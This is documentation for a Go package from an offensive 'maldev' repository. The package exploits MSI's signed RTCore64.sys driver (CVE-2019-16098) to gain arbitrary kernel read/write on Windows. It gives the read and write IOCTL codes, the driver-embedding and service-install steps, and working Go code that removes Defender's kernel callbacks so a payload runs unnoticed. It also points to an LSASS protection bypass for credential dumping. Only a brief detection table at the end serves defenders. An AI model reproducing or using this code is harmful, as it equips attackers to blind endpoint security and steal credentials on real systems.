## TL;DR

You need arbitrary kernel read/write from user mode (typically
to bypass LSASS PPL or zero a kernel callback). This package
loads MSI Afterburner's signed RTCore64.sys driver, exploits
its CVE-2019-16098 read/write IOCTL, and exposes
[`kernel/driver.ReadWriter`](https://pkg.go.dev/github.com/oioio-space/maldev/kernel/driver#ReadWriter)
to the consumer.

| You want to… | Use | Constraint |
|---|---|---|
| Get a kernel R/W primitive | [`Install`](#install) | Admin + `SeLoadDriverPrivilege` + driver bytes shipped |
| Read kernel memory | [`ReadKernel`](#readkernel) | After `Install` succeeded |
| Write kernel memory | [`WriteKernel`](#writekernel) | Same |
| Clean up after the op | [`Uninstall`](#uninstall) | Best-effort — deletes service + unregisters driver |

⚠ **HVCI block-list cutoff**: as of 2021-09 Microsoft ships
a driver block-list that includes RTCore64. On HVCI-on hosts
**newer than the block-list update**, the driver load is
refused. Verify via [`Loaded`](#loaded) / catch
`ErrPrivilegeRequired` / probe with a non-destructive read
before relying on this primitive.

⚠ **Driver bytes not bundled** — ship `RTCore64.sys` via
`//go:embed` behind the `byovd_rtcore64` build tag, OR via
`Config.Bytes`. Default builds return `ErrDriverBytesMissing`
to keep the maldev repo free of the signed driver itself.

What this DOES achieve:

- Pre-block-list HVCI hosts: full kernel R/W from user mode
  with one signed driver load.
- LSASS PPL bypass via [`credentials/lsassdump`](../credentials/lsassdump.md)'s
  PPL-flip path (consumes this driver).
- Kernel-callback removal via
  [`evasion/kernel-callback-removal`](../evasion/kernel-callback-removal.md)
  (consumes this driver).

What this does NOT achieve:

- **Stealth driver load** — `NtLoadDriver` + SCM CreateService
  fire kernel callbacks, ETW Microsoft-Windows-Kernel-Process,
  and Defender's "Microsoft-attested driver" detection. Driver
  install IS the loud event; once loaded, IOCTLs are quieter.
- **PatchGuard immunity** — RTCore64's slow-IOCTL pattern
  generally stays below PG's scan thresholds, but kernel
  writes to certain critical structures (KPP-protected
  pages) trigger BSOD on next scan. Tested-safe targets
  documented in the consumer pages.
- **Doesn't survive reboot** — service registration cleaned
  by `Uninstall`. For persistence of kernel R/W, you need a
  different primitive.

## Primer

EDR vendors register kernel-mode callbacks (`PsSetCreateProcessNotifyRoutineEx`,
`PsSetCreateThreadNotifyRoutine`, `PsSetLoadImageNotifyRoutine`, …) that
receive every process/thread/image-load event. To remove them — or to
read kernel structures like `EPROCESS.Protection` (LSASS PPL) or
`PspCreateProcessNotifyRoutine[]` — userland needs an arbitrary kernel
read/write primitive.

**BYOVD** (Bring Your Own Vulnerable Driver) sidesteps the
"unsigned drivers don't load on HVCI" wall by abusing a **Microsoft-
attested signed driver** that itself exposes an unauthenticated
arbitrary-r/w IOCTL. RTCore64.sys (MSI Afterburner < 4.6.2.15658) is
the canonical target: signed, widely deployed, and its
CVE-2019-16098 IOCTLs `0x80002048` (read) and `0x8000204C` (write)
take a virtual address + length + buffer with no auth.

The 2021-09-02 Microsoft vulnerable-driver block-list update flagged
RTCore64 — patched HVCI Win10/11 builds refuse to load it. On
unpatched / non-HVCI hosts it still loads and grants kernel read/write
to any caller with `SeLoadDriverPrivilege`.

## Package surface

`kernel/driver/rtcore64` exposes a `Driver` type that implements both
`kernel/driver.ReadWriter` and `kernel/driver.Lifecycle`:

```go
var d rtcore64.Driver
if err := d.Install(); err != nil {       // SCM register + start + open device
    return err
}
defer d.Uninstall()                       // stop + delete + remove dropped binary

buf := make([]byte, 8)
if _, err := d.ReadKernel(0xFFFFF80012345678, buf); err != nil {
    return err                            // IoctlRead at the given VA
}
```

The `Driver` shape-satisfies `evasion/kcallback.KernelReadWriter`, so
it plugs straight into `kcallback.Enumerate` / `kcallback.Remove`
without wrappers.

### Lifecycle steps

1. `loadDriverBytes()` returns the embedded RTCore64.sys bytes (see
   [Driver binary](#driver-binary) below).
2. `dropDriver` writes the bytes to `%WINDIR%\Temp\RTCore64.sys`.
3. `installAndStartService` registers the driver under SCM as a
   `SERVICE_KERNEL_DRIVER` named `RTCore64`, then calls `StartService`.
   `ERROR_ACCESS_DENIED` is mapped to `driver.ErrPrivilegeRequired`.
4. `openDevice` opens `\\.\RTCore64` with `GENERIC_READ | GENERIC_WRITE`.
5. `ReadKernel` / `WriteKernel` issue `DeviceIoControl` against that
   handle. Transfers cap at `MaxPrimitiveBytes = 4096` per IOCTL —
   larger reads/writes loop in the caller, since RTCore64's pool
   transfers are unstable above one page.
6. `Uninstall` closes the handle, stops + deletes the service, and
   removes the dropped file. Best-effort: every step runs even if
   earlier ones failed.

### Driver binary

The package ships **without** the signed RTCore64.sys binary by
default — building with the default tag set yields
`ErrDriverBytesMissing` from `Install()`. To enable real BYOVD
operations:

1. Obtain RTCore64.sys (any version ≤ 4.6.2.15658). Verify the
   signature chain via `signtool verify /v /a` — the leaf cert must
   chain to `Microsoft Windows Hardware Compatibility Publisher`.
2. Drop a sibling file `kernel/driver/rtcore64/embed_byovd_rtcore64_windows.go`
   that overrides `loadDriverBytes()`:

   ```go
   //go:build windows && byovd_rtcore64

   package rtcore64

   import _ "embed"

   //go:embed RTCore64.sys
   var rtcoreBytes []byte

   func loadDriverBytes() ([]byte, error) { return rtcoreBytes, nil }
   ```

3. Build with `go build -tags=byovd_rtcore64`. The resulting binary
   embeds the signed driver; default builds don't.

This split keeps the open-source repo free of MSI's licensed binary
while still shipping every other piece of the BYOVD chain — the
service-install plumbing, IOCTL wrappers, and lifecycle management
all live in source-tree code.

## API → godoc

[`pkg.go.dev/github.com/oioio-space/maldev/kernel/driver`](https://pkg.go.dev/github.com/oioio-space/maldev/kernel/driver) is the authoritative
reference for every exported symbol. This page teaches the
*concepts*; the godoc is the *specification*.

## Advanced — looping reads beyond the per-IOCTL cap

A single IOCTL caps at `MaxPrimitiveBytes` (4096 bytes). Larger reads
loop in the caller — the driver's pool-buffer transfer is unstable
above one page:

```go
package main

import (
	"fmt"

	"github.com/oioio-space/maldev/kernel/driver"
	"github.com/oioio-space/maldev/kernel/driver/rtcore64"
)

// readKernel issues IOCTLs in <=MaxPrimitiveBytes chunks and concatenates
// the results. Bails on the first error so the caller can decide whether
// to retry from the partial offset.
func readKernel(rw driver.Reader, addr uintptr, size int) ([]byte, error) {
	out := make([]byte, 0, size)
	for off := 0; off < size; {
		chunk := size - off
		if chunk > rtcore64.MaxPrimitiveBytes {
			chunk = rtcore64.MaxPrimitiveBytes
		}
		buf := make([]byte, chunk)
		n, err := rw.ReadKernel(addr+uintptr(off), buf)
		if err != nil {
			return out, fmt.Errorf("read @0x%X (off=%d): %w", addr+uintptr(off), off, err)
		}
		out = append(out, buf[:n]...)
		off += n
	}
	return out, nil
}

func main() {
	var d rtcore64.Driver
	if err := d.Install(); err != nil { panic(err) }
	defer d.Uninstall()

	// Read 32 KiB starting at some kernel VA — 8 IOCTLs under the hood.
	bytes, err := readKernel(&d, 0xFFFFF80012345000, 32*1024)
	fmt.Printf("read=%d err=%v\n", len(bytes), err)
}
```

## Composed — RTCore64 + kcallback enumeration + selective Remove

The whole point of `kernel/driver/rtcore64` is to back a `driver.ReadWriter`
that downstream packages consume. `evasion/kcallback` is the canonical
consumer — given the driver, enumerate every PspCreate/Thread/LoadImage
notify routine and selectively neutralize an EDR's callbacks:

```go
package main

import (
	"fmt"
	"log"

	"github.com/oioio-space/maldev/evasion/kcallback"
	"github.com/oioio-space/maldev/kernel/driver/rtcore64"
)

func main() {
	// 1. Bring up the driver.
	var d rtcore64.Driver
	if err := d.Install(); err != nil { log.Fatal(err) }
	defer d.Uninstall()

	// 2. Operator-supplied OffsetTable for the current ntoskrnl build
	//    (derived offline from a PDB dump — see kernel-callback-removal.md).
	tab := kcallback.OffsetTable{
		Build:                   19045,
		CreateProcessRoutineRVA: 0xC1AAA0,
		CreateThreadRoutineRVA:  0xC1AC20,
		LoadImageRoutineRVA:     0xC1AB40,
		ArrayLen:                64,
	}

	// 3. Enumerate.
	cbs, err := kcallback.Enumerate(&d, tab)
	if err != nil { log.Fatal(err) }

	// 4. Selectively NULL-out every EDR-driver-owned slot. Restore on exit
	//    so the host doesn't notice tampering after a benign payload.
	var tokens []kcallback.RemoveToken
	for _, cb := range cbs {
		fmt.Printf("[%s][%d] %s @ 0x%X enabled=%v\n",
			cb.Kind, cb.Index, cb.Module, cb.Address, cb.Enabled)
		if cb.Module == "WdFilter.sys" || cb.Module == "MsSecCore.sys" {
			tok, err := kcallback.Remove(cb, &d)
			if err != nil { log.Printf("remove %s[%d]: %v", cb.Kind, cb.Index, err); continue }
			tokens = append(tokens, tok)
		}
	}
	defer func() {
		for _, tok := range tokens {
			_ = kcallback.Restore(tok, &d)
		}
	}()

	// ... payload runs here without EDR callbacks firing ...
}
```

The same `&d` plugs into `credentials/lsassdump.Unprotect` for a PPL
LSASS dump — see [LSASS Credential Dump](../collection/lsass-dump.md)
for that composition.

## Detection

| Phase | Signal |
|---|---|
| Drop | New file write to `%WINDIR%\Temp\RTCore64.sys` |
| SCM install | `CreateService` with `SERVICE_KERNEL_DRIVER` + name `RTCore64` |
| Driver load | `NtLoadDriver` event, `Microsoft-Windows-Kernel-General` ETW |
| IOCTL | `DeviceIoControl` against `\\.\RTCore64` with codes `0x80002048` / `0x8000204C` (every public PoC uses these exact codes) |

Detection drops to **Medium** once steady-state because the driver is
signed, but the device name is in every EDR's known-IOC list. Renaming
the dropped file does not help — the IOCTL device path is hard-coded
inside RTCore64.sys.
